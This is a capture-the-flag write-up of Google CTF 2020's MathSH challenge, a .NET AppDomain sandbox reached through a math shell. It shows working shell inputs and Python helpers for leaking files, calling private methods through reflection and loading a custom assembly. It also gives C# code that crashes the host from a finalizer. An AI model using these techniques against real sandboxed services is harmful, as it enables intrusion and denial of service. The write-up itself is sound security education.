# Google CTF Quals 2020 - MathSH
## Disclaimers
1. **We did _NOT_ solve this challenge.**  
Unfortunately, we didn't find a way to read the flag, but we managed to do some pretty cool stuff that we wanted to share.  
2. We started with 0 knowledge in C# so I assume some stuff I'll write here will be pretty obvious to the regular C# developer.  
3. Since this challenge requires a **LOT** of exploring, it's gonna be... Long... Very long... Sorry in advance ':D
## Overview
To start the challenge we are asked to `nc mathsh.2020.ctfcompetition.com 1337` - this brings us to the Math Shell:
```
Welcome to Math Shell.
Type exit() to close the shell, or help() for some help.
Type expression to evaluate, e.g. Math.Log(1.2, 3.4) + 5.6.
MathSH>
```
Bascially we have a shell that lets us do some basic math stuff. `help()` reveals more functions we can use:
```
MathSH> Math.Log(16, 2) * 2 - 1
7
MathSH> help()
<Functions>
memset
memget
memlist
memclear
array
eval
exit
quit
help
__init__
__flag__

<Namespaces>
Math
__global__
```
There is a LOT to write about the actual functionality of every line here, I won't cover everything here, but this is the general idea:
* **memset** - `memset("bla", 2)` - saves `(Double)2` in a local variable named "bla". The keys have to be strings, the values have to be doubles.
* **memget** - `memget("bla")` - gets the value of "bla" if it exists and displays it.
* **memlist** - `memlist()` - shows all the local variables created.
* **memclear** - `memclear()` - deletes all local variables.
* **array** - `array(1, 2, "asdf")` - creates an array of **objects**. This array can't be stored in a local variable but can hold any object. It will be displayed on the screen only if it contains numbers.
* **eval** - `eval("4+5")` - evaluates an expression.
* **exit** / **quit** - exists the program.
* **\_\_init\_\_** / **\_\_flag\_\_** / **\_\_global\_\_** - will be covered next.
## Guesswork
Now it's time to explore. The possibilities are endless but I'm gonna focus on how we discovered the next logical steps. First, this:
```
MathSH> __flag__()
Can't open flag file.
MathSH> __init__()
Couldn't find method __init__
MathSH> help(__global__)
Need to specify a type name such as __global__.System.String.
MathSH> help(__global__.System.String)
<Functions>
System.String Join(System.String, System.String[])
System.String Join(System.String, System.Object[])
System.String Join[T](System.String, System.Collections.Generic.IEnumerable`1[T])
System.String Join(System.String, System.Collections.Generic.IEnumerable`1[System.String])
System.String Join(System.String, System.String[], Int32, Int32)
Boolean Equals(System.Object)
....
```
We need to understand what the `__flag__` function does, why we can't call `__init__`. But we can call `help()` on every object, which is going to be helpful. The next breakthrough for me was just a guess - I decided to try different keywords and discovered that the shell has these as well:
```
MathSH> array(this, self, null, true, false)
Unable to cast object of type 'JScriptRunner.JScriptGlobal' to type 'System.IConvertible'.
```
The use of an array is just so I can show all of the keywords in one line. If one of them wouldn't have existed, I would get an error - `cannot find property`. **this** and **self** are the same. Fortunately, we can call `help()` on them and see why we failed to call `__init___`:
```
MathSH> help(this)
<Functions>
System.String __flag__()
Void __init__(Boolean)
<Properties>
System.Type Math
```
So now we can call `__init__(true)` and see what happens when we try to get the flag:
```
MathSH> __init__(true)
MathSH> __flag__()
SlimlineJScript.EvaluationException: Can't open flag file.
   at JScriptRunner.JScriptGlobal.WriteException(Exception ex)
   at JScriptRunner.JSShell.Run()
   at JScriptRunner.EntryPoint.Run(String flag_path, IShell shell)
   at GoogleCTF2020.Program.RunShell(IShell shell)
Additional Arguments:
0 = c:\ctf\flag.txt
```
Nice! So now we know the path of the flag, the names of namespaces and objects involved and how to show exceptions. The exception that was thrown is an internal exception, so what if we tried to use the built-in objects and functions to read the flag directly? Remember that we didn't get an error for accessing `__global__.System.String`? Let's try to call `__global__.System.IO.File.ReadAllText()`:
```
MathSH> __global__.System.IO.File.ReadAllText("c:\\ctf\\flag.txt")
System.Security.SecurityException: Request for the permission of type 'System.Security.Permissions.FileIOPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089' failed.
   at JScriptRunner.JScriptGlobal.WriteException(Exception ex)
   at JScriptRunner.JSShell.Run()
   at JScriptRunner.EntryPoint.Run(String flag_path, IShell shell)
   at GoogleCTF2020.Program.RunShell(IShell shell)
The action that failed was:
Demand
The type of the first permission that failed was:
System.Security.Permissions.FileIOPermission
The first permission that failed was:
<IPermission class="System.Security.Permissions.FileIOPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
version="1"
Read="c:\ctf\flag.txt"/>

The demand was for:
<IPermission class="System.Security.Permissions.FileIOPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
version="1"
Read="c:\ctf\flag.txt"/>

The granted set of the failing assembly was:
<PermissionSet class="System.Security.PermissionSet"
version="1">
<IPermission class="System.Security.Permissions.FileIOPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
version="1"
Read="C:\ctf\challenge\"
PathDiscovery="C:\ctf\challenge\"/>
<IPermission class="System.Security.Permissions.SecurityPermission, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
version="1"
Flags="Execution"/>
</PermissionSet>

The assembly or AppDomain that failed was:
SlimlineJScript, Version=1.3.8.0, Culture=neutral, PublicKeyToken=8591fe505af48527
The method that caused the failure was:
Void OnEvaluateFunction(System.String, SlimlineJScript.FunctionArgs)
The Zone of the assembly that failed was:
Internet
The Url of the assembly that failed was:
file:///C:/ctf/challenge/SlimlineJScript.DLL
```
Very interesting! We can learn from here that:
* This is C# code.
* We are running in an [AppDomain](https://docs.microsoft.com/en-us/dotnet/api/system.appdomain?view=netcore-3.1), which is a way to sandbox code in C#.NET.
* There are specific permissions to the AppDomain, restricting us to the `C:\ctf\challenge` directory.
* We have access to list the *challenge* directory and this is where the executing DLL sits.
## Leaking the Challenge Files
The permissions we are given let us list the *challenge* directory and get files from it:
```
MathSH> __global__.System.IO.Directory.GetFiles("C:\\ctf\\challenge")
Input string was not in a correct format.
```
That's because the return value is an array of strings... Time to return to `memset()` - we know we can store strings (as keys) and display them later with `memlist()`. `System.String` provides us with the static function `System.String Join(System.String, System.String[])` to our benefit:
```
MathSH> memset(__global__.System.String.Join("\n", __global__.System.IO.Directory.GetFiles("C:\\ctf\\challenge")), 1)
MathSH> memlist()
C:\ctf\challenge\Antlr3.Runtime.dll
C:\ctf\challenge\GoogleCTF2020.exe
C:\ctf\challenge\JScriptRunner.dll
C:\ctf\challenge\SlimlineJScript.dll = 1
```
Leaking the files is easy using the `__global__.System.IO.File.ReadAllBytes` function:
```
MathSH> __global__.System.IO.File.ReadAllBytes("C:\\ctf\\challenge\\GoogleCTF2020.exe")
77
90
144
0
3
...
```
The files can be found [here](https://github.com/amelkiy/write-ups/tree/master/GoogleCTF-2020/MathSH/challenge).
## Dominating the Shell
After "reverse engineering" (it's .NET so we can see the source. I used dotPeek) the binaries we have a pretty good understanding of how the shell operates:
* Program starts to run with full privileges.
* An AppDomain is created with the permissions we can see from the SecurityException.
* Program creates an instance of `JScriptRunner.EntryPoint` inside the AppDomain and calls its method - Run(), passing the flag path and the "communication shell" - the means to communicate with the client.
* The EntryPoint instantiates a JSShell object and runs it.
* JSShell implements the shell interface, uses the ExpressionResolver to resolve the statements and operates on a JScriptGlobal object (`this` in the shell).
* The ExpressionResolver uses a helper class JScriptUtils to invoke methods through Reflection.  
The `JScriptUtils` class is the most interesting one for us, since all the functions there are static and we can use them to call methods that are not directly exposed to the shell. This is the interface it provides:
```
// Creates a delegate for the method.
internal static Delegate CreateDelegate(Type delegate_type, MethodInfo mi, object target);
// Calls the function "name" under "targetObject" with "args". This call is done with ReflectionPermission(PermissionState.Unrestricted). Calls only public functions.
internal static object CallMethodSecure(object targetObject, string name, bool case_sensitive, object[] args);
// Calls a method directly.
public static object CallMethod(MethodInfo method, object targetObject, object[] args) => method.Invoke(targetObject, args);
// Creates a BindingFlags bitmap based on the given parameters.
private static BindingFlags GetFlags(bool static_type, bool case_sensitive, bool non_public);
// Finds a given Type name in all loaded assemblies.
public static Type FindType(string name, bool case_sensitive);
// Returns a method of a give Type if exists using the given binding flags.
public static MethodInfo GetMethod(Type type, string name, bool static_type, bool case_sensitive, bool non_public, object[] args);
// Calls a public method "name" of a given object "targetObject" with "args".
public static object CallMethod(object targetObject, string name, bool case_sensitive, object[] args);
```
Normally, when we use the shell, the ExpressionResolver calls the last "CallMethod" function to invoke a requested method, which in turn finds a `public static` function of a `Type` or a `public` function of an instance, and calls it. If we want to call methods that are non-static or private, we're gonna have to get creative. We can call `GetMethod` ourselves, provide the flags that we want and use the returned method as a parameter to the fist "CallMethod" function. Let's try that:
```
MathSH> __global__.System.AppDomain.CurrentDomain.GetAssemblies()
Cannot find function System.AppDomain.CurrentDomain.GetAssemblies
MathSH> memset(__global__.JScriptRunner.JScriptUtils.GetMethod(__global__.System.AppDomain, "GetAssemblies", false, true, false, array()), 999)
MathSH> memlist()
System.Reflection.Assembly[] GetAssemblies() = 999
MathSH> __global__.JScriptRunner.JScriptUtils.CallMethod(__global__.JScriptRunner.JScriptUtils.GetMethod(__global__.System.AppDomain, "GetAssemblies", false, true, false, array()), __global__.System.AppDomain.CurrentDomain, array())
Unable to cast object of type 'System.Reflection.RuntimeAssembly' to type 'System.IConvertible'.
```
Ok that works! Let's print out the loaded assemblies:
```
MathSH> memset(__global__.System.String.Join("\n", __global__.JScriptRunner.JScriptUtils.CallMethod(__global__.JScriptRunner.JScriptUtils.GetMethod(__global__.System.AppDomain, "GetAssemblies", false, true, false, array()), __global__.System.AppDomain.CurrentDomain, array())), 808080)
MathSH> memlist()
mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
JScriptRunner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=8591fe505af48527
System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
SlimlineJScript, Version=1.3.8.0, Culture=neutral, PublicKeyToken=8591fe505af48527
Antlr3.Runtime, Version=3.1.3.22795, Culture=neutral, PublicKeyToken=63cc7d09cf70b7c1 = 808080
```
Time for some infrastructure!
```
def convert_arg(arg):
    if isinstance(arg, basestring):
        return '"{}"'.format(arg)
    elif isinstance(arg, bool):
        return str(arg).lower()
    elif isinstance(arg, (int, long)):
        return str(arg)
    elif isinstance(arg, list):
        return MakeArray(*arg)

    raise Exception("Unconvertible argument!")


def MakeArray(*args):
    return "array({})".format(', '.join([str(arg) for arg in args]))


JScriptUtils = '__global__.JScriptRunner.JScriptUtils'
GetMethod_func = '__global__.JScriptRunner.JScriptUtils.GetMethod'
CallMethod_func = '__global__.JScriptRunner.JScriptUtils.CallMethod'

def GetMethod(target_object, name, static_type, case_sensitive, non_public, args):
    return '{func}({target_object}, {name}, {static_type}, {case_sensitive}, {non_public}, {args})'.format(
        func=GetMethod_func,
        target_object=target_object,
        name=convert_arg(name),
        static_type=convert_arg(static_type),
        case_sensitive=convert_arg(case_sensitive),
        non_public=convert_arg(non_public),
        args=args,
    )

def CallMethodImpl(method, target, *args):
    return '{func}({method}, {target}, {args})'.format(
        func=CallMethod_func,
        method=method,
        target=target,
        args=MakeArray(*args),
    )
```
Now we can write sensible python code to talk with the interpreter. This is an example of how to set a value of a private static field (`System.Exception.s_EDILock`):
```
# Type.GetField
GetField_method = GetMethod(Type, "GetField", False, True, False, MakeArray(convert_arg("asdf"), GetFlags(True, True, True)))

# typeof(System.Exception).GetField("s_EDILock", BindingFlags.Static | BindingFlags.NonPublic)
ex_s_EDILock_field = CallMethodImpl(GetField_method, ExceptionType, convert_arg("s_EDILock"), GetFlags(True, True, True))

# typeof(System.Exception).GetField("s_EDILock", BindingFlags.Static | BindingFlags.NonPublic).SetValue(10)
line_to_send = CallMethodSecure(ex_s_EDILock_field, "SetValue", ExceptionType, 10)

# remote is pwn.remote(HOST, PORT)
remote.sendline(line_to_send)
```
So we can do some pretty sophisticated stuff, now let's see how can we attack the mechanism.
## Attack Vectors
Now this is the part that we failed to overcome :D but these were some of our attack vectors:
### Attack Vector #1 - Exception.ToString
The shell itself is running fully inside the AppDomain, but the exception handling mechanism can throw an exception all the way to the caller of the AppDomain. This is the function that handles the exceptions inside (`JScriptRunner.JScriptGlobal`):
```
internal void WriteException(Exception ex)
{
  if (ex is TargetInvocationException)
	ex = ex.InnerException;
  if (this._fatal_exception)
	throw ex;
  this.Shell.WriteLine(ex.Message);
}
```
if `_fatal_exception = true` then the exception is re-thrown. `_fatal_exception` is set by calling `__init__` so we have full control over this. The next catch block is in the code that is instantiating the EntryPoint inside the AppDomain (`GoogleCTF2020.Program`):
```
private static void RunShell(IShell shell)
{
  try
  {
	Program.GetInstance().Run(Program._flag_path, shell);
  }
  catch (Exception ex)
  {
	shell.WriteLine((object) ex);
  }
}
```
The idea here is:
* Create an Exception.
* Make the ToString of the exception read the flag file and write it to the shell.
* Throw the exception after doing `__init__(true)`.
Unfortunately, we couldn't make it work, since all the custom execptions we created were defined in assemblies that were loaded into the AppDomain (see Loading a Custom Assembly) and the code shared the restricted permissions.
### Attack Vector #2 - Leverage SetLeaseTime
The `JScriptRunner.EntryPoint` class provides a function that asserts full permissions to set the `LeaseTime` for remoting objects;
```
[SecurityCritical]
private static void SetLeaseTime()
{
  if (EntryPoint._set_lease)
	return;
  EntryPoint._set_lease = true;
  new PermissionSet(PermissionState.Unrestricted).Assert();
  LifetimeServices.LeaseTime = TimeSpan.FromDays(365.0);
}
```
If we can modify some existing code and get this line: `LifetimeServices.LeaseTime = TimeSpan.FromDays(365.0);` to execute our code instead, we can run with unrestricted permissions. Unfortunately, all our efforts to do so failed and we couldn't get it to work.
## Using the Shel Obejct to Communicate Stuff Back
At this level of infra, we no longer want to use `memset() / metmlist()` to show strings, so we can just retrieve the Shell object from `JScriptRunner.JScriptGlobal` and use it to communicate. This involves getting the "Shell" Property and accessing its value:
```
JScriptGlobalType = FindType("JScriptRunner.JScriptGlobal")

# Type.GetProperty()
GetProperty = GetMethod(Type, "GetProperty", False, True, False, MakeArray(convert_arg("sdf"), GetFlags(True, True, True)))

# typeof(JScriptRunner.JScriptGlobal).GetProperty("Shell", BindingFlags.NonPublic)
GlobalShellProp = CallMethodImpl(GetProperty, JScriptGlobalType, convert_arg("Shell"), GetFlags(False, True, True))

# ShellProperty.GetValue(this)
MyShell = CallMethodSecure(GlobalShellProp, "GetValue", 'this')

# Shell.WriteLine("Hello World!")
line = CallMethodSecure(MyShell, "WriteLine", convert_arg("Hello World!"))
remote.sendline(line)
```
## Loading a Custom Assembly
During the research, we managed to create a lot of snippets to do complicated stuff we wanted. This is an example of how to load a custom compiled assembly:
```
Array = "__global__.System.Array"
JScriptUtils_Type = FindType("JScriptRunner.JScriptUtils")
MethodInfoType = FindType("System.Reflection.MethodInfo")

FromBase64String_func = '__global__.System.Convert.FromBase64String'
def Base64Decode(s):
    return '{func}({s})'.format(func=FromBase64String_func, s=convert_arg(s))

# System.Array.GetValue(int index)
ArrayGetValue_func = GetMethod(Array, "GetValue", False, True, False, MakeArray(1))
def ArrayGetValue(array, index):
    return CallMethodImpl(ArrayGetValue_func, array, index)

# MethodInfo.Invoke(object obj, object[] parameters)
MethodInfo_invoke1 = GetMethod(MethodInfoType, "Invoke", False, True, False, MakeArray(Object, MakeArray()))

# typeof(Assembly).GetMethods()
Assembly_methods = CallMethodImpl(GetMethods, AssemblyType, GetFlags(True, True, False))

# typeof(Assembly).GetMethods()[20]
# public static Assembly Load(byte[] rawAssembly, byte[] rawSymbolStore, SecurityContextSource securityContextSource)
Assembly_Load_3params = ArrayGetValue(Assembly_methods, 20)

# typeof(Assembly).GetMethods()[20].Invoke(Assembly, Base64Decode(BASE64_OF_THE_COMPILED_DLL), null, SecurityContextSource.CurrentAppDomain)
LoadMyAssembly = CallMethodSecure(JScriptUtils_Type, "CallMethod", MethodInfo_invoke1, Assembly_Load_3params, MakeArray(AssemblyType, MakeArray(
    Base64Decode(BASE64_OF_THE_COMPILED_DLL), null, 0
)))

remote.sendline(LoadMyAssembly)
```
Let's understand what's happening here.  
First of all, when we try to load an assembly, we can only load it into the current AppDomain. However, the "normal" Assembly.Load functions usually use `SecurityContextSource.CurrentAssembly` as the `securityContextSource`, so we need to specify explicitly that we want to load it under `SecurityContextSource.CurrentAppDomain`. Unfortunately, `SecurityContextSource` is an `enum`, and we can't access `enum`s using the shell... So we need to get a little creative: Find the method in the array of Assembly.GetMethods() and invoke it directly.  
Next there is the challenge of actually calling it - we want to pass `null` as the `rawSymbolStore`, but `JScriptRunner.JScriptUtils` doesn't handle `null` too well when passing it as a parameter to a function. Also, we need full `ReflectionPermission`s to execute it. So we chain `CallMethodSecure` with `CallMethod` to call `MethodInfo.Invoke` on the `Assembly.Load` method.  
Unfortunately, the assembly is loaded as security transparent, so we can't really use it to escalate, but we can write C# code.
## Crashing the Program
This idea came from trying to execute code from another context. The context we wanted to leverage is the Garbage Collector context, and execute code in the destructor. That did not work since the objects that are being used are still loaded into the lower permission AppDomain. But raising an exception from the destructor context actually crashed the GC thread anc crashes the whole program. This is the C# code that we used:
```
using System;

namespace FileLoadException
{
	public class MyTest : MarshalByRefObject{
		~MyTest(){
			throw new Exception();
		}
	}
	public class FileLoadException
    {
        public MyTest GetSpecialClass(){
            return new MyTest();
        }
	}
}
```
The python code:
```
dll = file(sys.argv[1], 'rb').read()
dll_base64 = dll.encode("base64").replace("\n", "").replace("\r", "")

LoadMyAssembly = CallMethodSecure(JScriptUtils_Type, "CallMethod", MethodInfo_invoke1, Assembly_Load_3params, MakeArray(AssemblyType, MakeArray(
    Base64Decode(dll_base64), null, 0
)))
remote.sendline(LoadMyAssembly)

# Create and "lose" an instance of MyTeSt
line = CallMethodSecure(FileLoadException, "GetSpecialClass")
remote.sendline(line)

# Call the garbage collector - this will trigger the ~MyTest
line = '__global__.System.GC.Collect()'
remote.sendline(line)
```
And the exception is thrown in the GC thread:
```
c:\ctf\challenge>GoogleCTF2020.exe c:\ctf\flag.txt 1337 all
Listening on [::]:1337

Unhandled Exception: System.Exception: Exception of type 'System.Exception' was thrown.
   at FileLoadException.MyTest.Finalize()

c:\ctf\challenge>
```
## Conclusion
All in all, this was a super fun challenge to play with, we had a lot of fun, and we learned A LOT! We were very disappointed that we didn't finish it on time and that we haven't figured out how to solve it, but this was a great learning tool.  
Thanks for reading!